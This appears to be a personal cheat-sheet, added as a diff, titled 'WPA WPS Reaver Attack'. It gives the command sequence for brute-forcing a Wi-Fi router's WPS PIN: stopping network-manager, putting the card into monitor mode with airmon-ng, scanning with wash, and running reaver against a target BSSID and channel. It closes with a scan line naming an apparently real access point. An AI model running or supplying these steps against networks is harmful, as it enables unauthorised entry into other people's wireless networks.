@@ -1,0 +1,20 @@
+WPA WPS Reaver Attack
+
+service network-manager stop 
+airmon-ng start wlan0
+wash -i wlan0mon
+
+*new window*
+reaver -b 00:00:00:00:00:00 -c 1 -i wlan0mon
+
+
+
+
+
+           "target bssid"    "ch"
+reaver -b 00:00:00:00:00:00 -c 1 -i wlan0mon
+
+
+
+
+20:25:64:A8:A4:78  -68       21        9    3   1  54e. WPA2 CCMP   PSK  CBCI-953A-2.4     
